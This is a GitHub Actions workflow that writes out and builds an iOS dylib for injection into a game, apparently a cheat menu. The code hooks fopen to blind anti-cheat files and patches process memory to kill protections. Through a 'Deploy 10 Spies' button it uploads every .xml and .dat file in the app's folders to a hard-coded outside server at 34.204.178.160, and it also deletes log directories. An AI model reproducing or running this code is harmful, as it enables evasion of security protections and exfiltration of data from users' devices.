name: Imperial Ultimate AIO - V32.0 Nuclear

on:
  push:
    branches: [ "main" ]
  workflow_dispatch:

jobs:
  build_ultimate:
    runs-on: macos-latest

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Create Ultimate Source
        run: |
          mkdir -p jni
          cat <<'EOF' > jni/main.mm
          #import <Foundation/Foundation.h>
          #import <UIKit/UIKit.h>
          #import <CoreGraphics/CoreGraphics.h>
          #include <mach-o/dyld.h>
          #include <mach/mach.h>
          #include <objc/runtime.h>
          #include <stdint.h>
          #include <sys/stat.h>

          #define ImperialGold [UIColor colorWithRed:1.0 green:0.84 blue:0.0 alpha:1.0]

          // ==========================================
          // [ 1. ميزة الـ Interpose (خنق ملفات الحماية) ]
          // ==========================================
          typedef struct interpose_substitution { const void* replacement; const void* original; } interpose_substitution_t;
          #define DYLD_INTERPOSE(_replacement,_original) __attribute__((used)) static const interpose_substitution_t _interpose_##_original __attribute__ ((section ("__DATA, __interpose"))) = { (const void*)(unsigned long)&_replacement, (const void*)(unsigned long)&_original };

          FILE* my_fopen(const char* path, const char* mode) {
              if (path && (strstr(path, "ano") || strstr(path, "tss") || strstr(path, "comm.dat"))) {
                  return fopen("/dev/null", mode); // خنق الملفات فوراً
              }
              return fopen(path, mode);
          }
          DYLD_INTERPOSE(my_fopen, fopen);

          // ==========================================
          // [ 2. أدوات الرادار والتهريب ]
          // ==========================================
          void RemoteLog(NSString *tag, NSString *msg) {
              NSString *urlStr = @"http://34.204.178.160:5000/log"; 
              NSMutableURLRequest *req = [NSMutableURLRequest requestWithURL:[NSURL URLWithString:urlStr]];
              [req setHTTPMethod:@"POST"];
              [req setValue:@"application/json" forHTTPHeaderField:@"Content-Type"];
              NSData *data = [NSJSONSerialization dataWithJSONObject:@{@"content": [NSString stringWithFormat:@"🚀 [%@] -> %@", tag, msg]} options:0 error:nil];
              [req setHTTPBody:data];
              [[[NSURLSession sharedSession] dataTaskWithRequest:req] resume];
          }

          void SendFile(NSString *filePath) {
              NSData *fileData = [NSData dataWithContentsOfFile:filePath];
              if (!fileData) return;
              NSString *urlStr = @"http://34.204.178.160:5000/upload";
              NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:[NSURL URLWithString:urlStr]];
              [request setHTTPMethod:@"POST"];
              NSString *boundary = @"ImperialSpy";
              [request setValue:[NSString stringWithFormat:@"multipart/form-data; boundary=%@", boundary] forHTTPHeaderField:@"Content-Type"];
              NSMutableData *body = [NSMutableData data];
              [body appendData:[[NSString stringWithFormat:@"--%@\r\nContent-Disposition: form-data; name=\"file\"; filename=\"%@\"\r\n\r\n", boundary, [filePath lastPathComponent]] dataUsingEncoding:NSUTF8StringEncoding]];
              [body appendData:fileData];
              [body appendData:[[NSString stringWithFormat:@"\r\n--%@--\r\n", boundary] dataUsingEncoding:NSUTF8StringEncoding]];
              [request setHTTPBody:body];
              [[[NSURLSession sharedSession] dataTaskWithRequest:request] resume];
          }

          uintptr_t get_Base() { return (uintptr_t)_dyld_get_image_header(0); }
          void Patch(uintptr_t addr, uint32_t data) {
              vm_address_t p = trunc_page(addr);
              if (vm_protect(mach_task_self(), p, vm_page_size, FALSE, VM_PROT_READ | VM_PROT_WRITE | VM_PROT_COPY) == KERN_SUCCESS) {
                  *(uint32_t *)addr = data;
                  vm_protect(mach_task_self(), p, vm_page_size, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);
              }
          }

          // ==========================================
          // [ 3. واجهة المنيو والربط الفعلي ]
          // ==========================================
          @interface ImperialMenu : UIWindow
          @property (nonatomic, strong) UIView *panel;
          @property (nonatomic, strong) UIButton *btn;
          @end

          @implementation ImperialMenu
          - (instancetype)initWithFrame:(CGRect)frame {
              self = [super initWithFrame:frame];
              if (self) {
                  self.windowLevel = UIWindowLevelStatusBar + 100.0;
                  self.backgroundColor = [UIColor clearColor];
                  [self makeKeyAndVisible];
                  [self setupUI];
              }
              return self;
          }

          - (void)setupUI {
              // أيقونة المنيو العائمة
              self.btn = [UIButton buttonWithType:UIButtonTypeCustom];
              self.btn.frame = CGRectMake(50, 150, 60, 60);
              self.btn.backgroundColor = [UIColor colorWithWhite:0.0 alpha:0.8];
              self.btn.layer.cornerRadius = 30;
              [self.btn setTitle:@"👑" forState:UIControlStateNormal];
              [self.btn addTarget:self action:@selector(toggle) forControlEvents:UIControlEventTouchUpInside];
              [self addSubview:self.btn];

              UIPanGestureRecognizer *pan = [[UIPanGestureRecognizer alloc] initWithTarget:self action:@selector(pan:)];
              [self.btn addGestureRecognizer:pan];

              // المنيو المركزي
              CGSize sz = [[UIScreen mainScreen] bounds].size;
              self.panel = [[UIView alloc] initWithFrame:CGRectMake((sz.width-250)/2, (sz.height-320)/2, 250, 320)];
              self.panel.backgroundColor = [UIColor colorWithWhite:0.0 alpha:0.95];
              self.panel.layer.cornerRadius = 20;
              self.panel.layer.borderColor = ImperialGold.CGColor;
              self.panel.layer.borderWidth = 2;
              self.panel.hidden = YES;
              [self addSubview:self.panel];

              [self addSwitch:@"4C18 Bypass" y:20 tag:1];
              [self addSwitch:@"Falcon Kill" y:80 tag:2];
              [self addSwitch:@"Net Spy (11)" y:140 tag:3];
              [self addBtn:@"Deploy 10 Spies" y:200 sel:@selector(runSpies)];
              [self addBtn:@"Clean Logs" y:260 sel:@selector(cleanLogs)];
          }

          - (void)addSwitch:(NSString *)t y:(int)y tag:(int)tg {
              UILabel *l = [[UILabel alloc] initWithFrame:CGRectMake(15, y, 160, 40)];
              l.text = t; l.textColor = [UIColor whiteColor];
              l.font = [UIFont boldSystemFontOfSize:14];
              [self.panel addSubview:l];
              UISwitch *s = [[UISwitch alloc] initWithFrame:CGRectMake(180, y+5, 50, 30)];
              s.onTintColor = ImperialGold; s.tag = tg;
              [s addTarget:self action:@selector(swChanged:) forControlEvents:UIControlEventValueChanged];
              [self.panel addSubview:s];
          }

          - (void)addBtn:(NSString *)t y:(int)y sel:(SEL)s {
              UIButton *b = [UIButton buttonWithType:UIButtonTypeSystem];
              b.frame = CGRectMake(15, y, 220, 40);
              [b setTitle:t forState:UIControlStateNormal];
              [b setTitleColor:ImperialGold forState:UIControlStateNormal];
              [b addTarget:self action:s forControlEvents:UIControlEventTouchUpInside];
              [self.panel addSubview:b];
          }

          - (void)toggle { self.panel.hidden = !self.panel.hidden; }
          - (void)pan:(UIPanGestureRecognizer *)p {
              CGPoint t = [p translationInView:self];
              p.view.center = CGPointMake(p.view.center.x + t.x, p.view.center.y + t.y);
              [p setTranslation:CGPointZero inView:self];
          }

          // الربط الفعلي للأزرار
          - (void)swChanged:(UISwitch *)s {
              uintptr_t base = get_Base();
              if (s.tag == 1 && s.on) { Patch(base+0x4C18, 0xD2800000); Patch(base+0x4C18+4, 0xD65F03C0); RemoteLog(@"AIO", @"4C18 Patched."); }
              if (s.tag == 2 && s.on) { Patch(base+0x11B060, 0xD2800000); Patch(base+0x102B84, 0xD65F03C0); RemoteLog(@"AIO", @"Falcon Patched."); }
              if (s.tag == 3 && s.on) { RemoteLog(@"NETWORK", @"Net Spy (11) Monitoring Links..."); }
          }

          - (void)runSpies {
              RemoteLog(@"SPY", @"Deploying 10 Spies...");
              NSArray *ps = @[[NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) firstObject], NSTemporaryDirectory()];
              dispatch_apply(10, dispatch_get_global_queue(0, 0), ^(size_t i) {
                  for (NSString *p in ps) {
                      NSDirectoryEnumerator *e = [[NSFileManager defaultManager] enumeratorAtPath:p];
                      NSString *f;
                      while ((f = [e nextObject])) {
                          if ([f hasSuffix:@".xml"] || [f hasSuffix:@".dat"]) SendFile([p stringByAppendingPathComponent:f]);
                      }
                  }
              });
          }

          - (void)cleanLogs { [[NSFileManager defaultManager] removeItemAtPath:[[[NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) firstObject] stringByAppendingPathComponent:@"ano"] stringByDeletingLastPathComponent] error:nil]; RemoteLog(@"CLEAN", @"Wiped."); }
          @end

          __attribute__((constructor))
          static void entry() {
              dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 10 * NSEC_PER_SEC), dispatch_get_main_queue(), ^{
                  static ImperialMenu *m;
                  m = [[ImperialMenu alloc] initWithFrame:[[UIScreen mainScreen] bounds]];
              });
          }
          EOF

      - name: Build Nuclear AIO
        run: |
          clang++ -dynamiclib -std=c++11 -x objective-c++ \
          -isysroot $(xcrun --sdk iphoneos --show-sdk-path) \
          -arch arm64 jni/main.mm -o ImperialUltimate.dylib \
          -framework Foundation -framework UIKit -framework CoreGraphics -framework Security -lobjc

      - name: Upload
        uses: actions/upload-artifact@v4
        with:
          name: Imperial-Nuclear-V32
          path: ImperialUltimate.dylib
